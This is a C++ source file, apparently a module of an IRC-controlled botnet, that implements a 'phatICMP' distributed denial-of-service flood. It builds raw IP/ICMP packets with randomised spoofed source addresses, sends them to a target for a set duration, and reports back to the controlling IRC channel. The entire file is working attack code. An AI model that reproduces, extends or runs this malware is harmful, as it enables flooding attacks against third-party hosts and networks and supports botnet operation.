#include "main.h"
#include "mainctrl.h"

inline unsigned long spoofip (unsigned long t_target)
{
	struct in_addr hax0r;
	char convi[16];
	int a, b, c, d;
	hax0r.s_addr = htonl (t_target);
	sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);
	a = brandom(1,254);
	b = brandom(1,254);
	sprintf (convi, "%d.%d.%d.%d", d, c, b, a);
	return inet_addr (convi);
}

long PhatICMPFlood(char *target, int len, int delay);

CDDOSPhatICMPFlood::CDDOSPhatICMPFlood() { m_szType="CDDOSPhatICMPFlood"; m_sDDOSName.Assign("phatICMP"); }

void CDDOSPhatICMPFlood::StartDDOS()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s for %u seconds, %d ms delay.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iTime, m_iDelay);
	CString sReply; sReply.Format("%s: %s [%i]", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, PhatICMPFlood(m_sHost.Str(), m_iTime, m_iDelay)/1024/m_iTime);
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr()); }

long SendPhatICMP(unsigned long TargetIP, int len, int delay)
{
  sockaddr_in icmp_sa;
  unsigned long lTimerCount=0;
  int rawsock=0;
#ifdef WIN32
  BOOL flag=TRUE;
#else
  bool flag=true;
#endif
  //rawsock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
  rawsock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  //setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));
  
  struct iph *ih;
  struct icmp *icmph;
  int rc;

  unsigned char  *packet;
  packet = (unsigned char *)malloc(sizeof(struct iph) + sizeof(struct icmp) + 8);
  
  ih = (struct iph *)packet;
  icmph = (struct icmp *)(packet + sizeof(struct iph));
  memset(ih,0,sizeof(struct iph) + sizeof(struct icmp) + 8);
  
  lTimerCount=GetTickCount();

  for (;;)
  {
  ih->ihl = 5;
  ih->version = 4;
  ih->tos = 4;
  ih->id = htons(1234);
  ih->frag_off = htons(0x2000);
  ih->tot_len = 0;
  ih->ttl = 255;
  ih->protocol = IPPROTO_ICMP;
  ih->saddr = spoofip(TargetIP);
  ih->daddr = TargetIP;
  ih->check = checksum((unsigned short*)ih, sizeof(struct iph));
  
  icmp_sa.sin_family = AF_INET;
  icmp_sa.sin_port = htons (0);
  icmp_sa.sin_addr.s_addr = ih->daddr;

  icmph->type = rand() % 18;
  icmph->code = rand() % 15;
  icmph->sum = checksum((unsigned short*)icmph,sizeof(struct icmp) + 1);

  sendto(rawsock, (const char*)packet, sizeof(struct iph) + sizeof(struct icmp) + 1,0, (struct sockaddr *) &icmp_sa, sizeof(icmp_sa));
  
  if((GetTickCount()-lTimerCount)/1000>len) break;
  Sleep(delay);
  }
  
  return 0;
}

long PhatICMPFlood(char *target, int len, int delay)
{	unsigned long TargetIP;
	CDNS cDNS; TargetIP=cDNS.ResolveAddress(target);
	return SendPhatICMP(TargetIP, len, delay); }
